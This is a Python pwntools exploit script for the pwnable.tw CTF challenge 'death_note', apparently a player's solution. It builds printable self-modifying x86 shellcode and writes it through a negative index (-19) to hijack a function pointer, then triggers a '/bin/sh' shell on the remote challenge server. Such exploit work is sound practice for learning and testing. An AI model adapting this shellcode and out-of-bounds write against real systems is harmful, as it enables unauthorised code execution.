#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
#  context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./death_note")
    elf = ELF("./death_note")
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    #  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

else:
    io = remote("chall.pwnable.tw", 10201)
    elf = ELF("./death_note")
    #  libc = ELF("")

def DEBUG():
	raw_input("DEBUG: ")
	gdb.attach(io)

def addName(idx, name):
    io.sendlineafter("choice :", "1")
    io.sendlineafter("Index :", str(idx))
    io.sendlineafter("Name :", name)

def showName(idx):
    io.sendlineafter("choice :", "2")
    io.sendlineafter("Index :", str(idx))

def delName(idx):
    io.sendlineafter("choice :", "3")
    io.sendlineafter("Index :", str(idx))

if __name__ == "__main__":
    sc = asm(
            '''
            pop ebp;
            pop ebx;
            push 0x7e;
            pop eax;
            inc eax;
            inc eax;
            xor [ebx+0x2a],eax;
            xor [ebx+0x2b],eax;
            push ecx;
            pop eax;
            inc eax;
            inc eax;
            inc eax;
            inc eax;
            inc eax;
            inc eax;
            inc eax;
            inc eax;
            inc eax;
            inc eax;
            inc eax;
            '''
            )
    sc += 'M'
    #  sc = '][j~X@@1C*1C+QX@@@@@@@@@@@M'
    success("len(sc) -> {}".format(len(sc)))
    success("sc -> {}".format(sc))
    addName(0, "/bin/sh\x00")
    addName(-19, sc)
    #  DEBUG()
    delName(0)

    io.interactive()
    io.close()
